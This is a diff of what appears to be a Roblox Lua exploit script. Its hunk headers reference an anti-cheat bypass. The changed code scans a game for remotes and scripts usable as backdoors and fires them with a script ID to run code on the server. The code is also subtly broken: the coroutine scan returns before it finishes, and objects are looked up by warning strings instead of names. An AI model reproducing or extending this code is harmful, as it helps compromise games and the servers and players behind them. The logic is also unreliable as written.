@@ -14,21 +14,27 @@ local function antiCheatBypass()
     end
 end
 
--- Advanced Backdoor Scan Function with Real-Time Updates
+-- Optimized Backdoor Scan Function with Coroutine
 local function scanForBackdoors()
     local backdoors = {}
     local methods = {"RemoteEvent", "RemoteFunction", "LoadString", "require", "ModuleScript", "Script"}
 
-    for _, obj in pairs(game:GetDescendants()) do
-        for _, method in pairs(methods) do
-            if obj:IsA(method) or (obj:IsA("ModuleScript") and obj.Source:find("require")) then
-                table.insert(backdoors, "[WARNING] Suspicious Object Found: " .. obj:GetFullName())
-            end
-            if obj:IsA("Script") and obj.Source:find("require") then
-                table.insert(backdoors, "[ALERT] Potential Exploit Script Detected: " .. obj:GetFullName())
+    local function scan()
+        for _, obj in pairs(game:GetDescendants()) do
+            for _, method in pairs(methods) do
+                if obj:IsA(method) or (obj:IsA("ModuleScript") and obj.Source:find("require")) then
+                    table.insert(backdoors, "[WARNING] Suspicious Object Found: " .. obj:GetFullName())
+                end
+                if obj:IsA("Script") and obj.Source:find("require") then
+                    table.insert(backdoors, "[ALERT] Potential Exploit Script Detected: " .. obj:GetFullName())
+                end
+                wait() -- Yield to avoid freezing
             end
         end
     end
+
+    local co = coroutine.create(scan)
+    coroutine.resume(co)
     return backdoors
 end
 
@@ -39,9 +45,12 @@ local function executeServerRequire(scriptID)
     for _, backdoor in ipairs(backdoors) do
         local success, result = pcall(function()
             local obj = game:GetService("ReplicatedStorage"):FindFirstChild(backdoor)
-            if obj and obj:IsA("RemoteFunction") then
+            if not obj then
+                error("[ERROR] Backdoor object not found: " .. backdoor)
+            end
+            if obj:IsA("RemoteFunction") then
                 return obj:InvokeServer(scriptID)
-            elseif obj and obj:IsA("RemoteEvent") then
+            elseif obj:IsA("RemoteEvent") then
                 obj:FireServer(scriptID)
                 return "[SUCCESS] Fired RemoteEvent"
             else
